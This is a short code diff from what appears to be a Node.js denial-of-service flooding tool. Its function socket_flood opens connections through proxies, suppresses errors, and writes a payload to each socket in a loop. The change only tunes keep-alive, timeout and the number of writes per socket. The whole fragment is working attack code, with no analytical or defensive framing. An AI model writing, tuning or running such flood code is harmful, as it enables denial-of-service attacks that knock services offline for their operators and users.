@@ -156,15 +156,15 @@ function socket_flood(args, proxy, ua){
         try{
             let socket = net.connect(proxy.split(':')[1], proxy.split(':')[0]);
             //console.log(payload)
-            socket.setKeepAlive(true, 50000)
-            socket.setTimeout(50000);
+            socket.setKeepAlive(true, 10000)
+            socket.setTimeout(10000);
             socket.once('error', err => {
             });
             socket.once('disconnect', () => {
             });
             socket.once('data', data => {
             });
-            for (let j = 0; j < 128; j++) {
+            for (let j = 0; j < 100; j++) {
                 socket.write(payload);
             }
             socket.on('data', function() {
